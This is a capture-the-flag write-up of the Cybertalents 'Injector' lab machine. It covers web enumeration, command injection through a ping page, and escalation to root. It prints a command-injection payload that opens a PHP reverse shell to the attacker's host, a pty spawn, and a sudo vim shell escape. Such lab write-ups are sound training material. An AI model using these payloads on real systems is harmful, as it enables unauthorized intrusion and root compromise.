---
title: Cybertalents Injector Machine
published: true
---

Hello, I'm **Omar**!
i hope y'all safe and still following me after my last writeup xD
Today i'll share with you my writeup for Injector Machine from Cybertalents.

![](/assets/injector/MachineDetails.png)

First of all, you should connect to CyberTalents VPN , You will see the instructions in the file given.

I'll start with the enumeration.

![](/assets/injector/iDontUsuallyMeme.png)


Hmm, we find port 22 opened for ssh, and 80 for http(web server) running under Apache/2.4.29

![](/assets/injector/nmapResult.png)

let's Discover the webserver....

![](/assets/2000yearslater.jpg)

Sorry for my weak machine :"

We'll See a Default Apache page it's automatically generated when you install apache.


![](/assets/injector/DefaultPage.png)

Nothing got my attention or interested , let's discover the hidden directories & file using dirsearch

using `dirsearch -u http://172.24.170.117/ -e *` we will get this result

![](/assets/injector/dirsearchone.png)

the secret directory is interesting,

![](/assets/injector/secretsus.png)

let's open the directory in browser

![](/assets/injector/secretdir.png)

nothing interesting, let's discover what's on using same command-line.

![](/assets/injector/tdirsearchtwocropped.png)

when i found admin.html i stopped the tool i go admin.html and said finally then the page loaded :) 

![](/assets/injector/trollpage.png)

i run the tool again and let the tool complete the scan :D 


![](/assets/injector/dirsearchtwo.png)

i went to all directories and found /tools didn't troll me 
in /tools i found "ping.php"
![](/assets/injector/secret-tools.png)



before i join i was know it's will be a [Command Injection](https://owasp.org/www-community/attacks/Command_Injection) Vulnerability
Okay open the php page, we will see input if we put 127.0.0.1 and click lookup the server will ping the ip.
![](/assets/injector/ping127.png)
It's so simple, let's get a quick reverse shell.
i'll using php for reverse shell and my command is `127.0.0.1; php -r '$sock=fsockopen("172.24.143.xx",1337);exec("/bin/sh -i <&3 >&3 2>&3");'`
before you execute the command we should make a netcat listener first.
![](/assets/injector/nc.png)
and then click lookup in the web-page
Okay, we now got a reverse shell.
![](/assets/injector/shell.png)

Firstly
Let's spawn a terminal i don't know why but i do it, using `python3 -c 'import pty;pty.spawn("/bin/bash")';`

![](/assets/injector/pythonterminal.png)

now we're on www-data we should get a user, after 2 days of trying & search i back the photo i found in /var/www a jpg photo called TrollFace.jpg.

let's copy it to our machine using [This netcat method](https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers)

Transaferd.
![](/assets/injector/sendend.png)
![](/assets/injector/refend.png)

i tried to use strings in the image but useless, i tried `steghide extract -sf TrollFace.jpg` without passphrase and it worked !
Lets cat the file

![](/assets/injector/steghide.png)

we got a password, lets see our users.
just cat /etc/passwd and We will see user alex,

![](/assets/injector/alexuser.png)

Let's switch user to alex using 'su' and use the password we got from TrollFace.jpg

![](/assets/injector/useralex.png)

Best Part,
![](/assets/injector/privesaclememe.png)

Let's do Some Privilege Escalation,
Firstly i do sudo -l for show the commands runs with root permissions,

![](/assets/injector/sudol.png)
Vim works with Root permissions, Here we go after ask my friend 'Hameed' he gave me this command and it's works well. Thank you!

``sudo vim -c ' : ! /bin/sh ' /usr/bin/vim``

We got a root shell!

![](/assets/injector/root.png)

Thank you for reading,any questions? contact me on facebook!

